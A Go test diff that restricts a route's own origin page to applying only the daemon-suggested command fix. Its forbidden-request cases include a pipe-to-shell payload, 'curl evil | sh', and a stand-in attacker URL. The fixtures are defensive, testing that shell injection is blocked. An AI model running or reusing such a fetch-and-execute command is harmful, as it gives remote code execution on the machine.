@@ -171,7 +171,6 @@ func TestRouteOriginScopedToOwnRoute(t *testing.T) {
 		{http.MethodPost, "/_api/routes/app/stop", ""},
 		{http.MethodDelete, "/_api/routes/app/stop", ""},
 		{http.MethodPost, "/_api/routes/app/repair", ""},
-		{http.MethodPut, "/_api/routes/app", `{"idle_timeout":5}`},
 		{http.MethodPost, "/_api/routes/app/worktrees", `{"path":"/nowhere"}`},
 	}
 	for _, c := range allowed {
@@ -184,6 +183,13 @@ func TestRouteOriginScopedToOwnRoute(t *testing.T) {
 		{http.MethodPost, "/_api/routes/other/start", ""},
 		{http.MethodPost, "/_api/routes/other/stop", ""},
 		{http.MethodPut, "/_api/routes/other", `{"idle_timeout":5}`},
+		// Own-route PUTs are limited to the suggested edit_cmd fix: a page
+		// that could set cmd and then start would have shell execution.
+		{http.MethodPut, "/_api/routes/app", `{"cmd":"curl evil | sh"}`},
+		{http.MethodPut, "/_api/routes/app", `{"idle_timeout":5}`},
+		{http.MethodPut, "/_api/routes/app", `{"port":7999}`},
+		{http.MethodPut, "/_api/routes/app", `{"url":"https://evil.example"}`},
+		{http.MethodPut, "/_api/routes/app", `{"oauth_callback_port":9999}`},
 		{http.MethodDelete, "/_api/routes/other", ""},
 		{http.MethodDelete, "/_api/routes/app", ""},
 		{http.MethodPut, "/_api/preferences", `{"view":"grid"}`},
@@ -199,6 +205,26 @@ func TestRouteOriginScopedToOwnRoute(t *testing.T) {
 	}
 	if _, ok := s.table.Get("other"); !ok {
 		t.Fatal("route origin deregistered another route")
+	}
+	if app, _ := s.table.Get("app"); app.Cmd != "x" {
+		t.Fatalf("route origin rewrote its cmd to %q", app.Cmd)
+	}
+
+	// The start page's one legitimate edit: the daemon-suggested cmd for the
+	// route's current failure — and only that exact cmd, alone.
+	app, _ := s.table.Get("app")
+	app.SetFailure(&Failure{Message: "python missing", Recovery: &Recovery{Action: "edit_cmd", SuggestedCmd: "python3 x"}})
+	if code := call(http.MethodPut, "/_api/routes/app", `{"cmd":"python3 x","port":7999}`); code != http.StatusForbidden {
+		t.Errorf("suggested cmd bundled with another field = %d; want 403", code)
+	}
+	if code := call(http.MethodPut, "/_api/routes/app", `{"cmd":"python3 y"}`); code != http.StatusForbidden {
+		t.Errorf("cmd other than the suggestion = %d; want 403", code)
+	}
+	if code := call(http.MethodPut, "/_api/routes/app", `{"cmd":"python3 x"}`); code != http.StatusOK {
+		t.Errorf("suggested edit_cmd fix = %d; want 200", code)
+	}
+	if app.Cmd != "python3 x" {
+		t.Fatalf("edit_cmd fix not applied: cmd=%q", app.Cmd)
 	}
 }
 
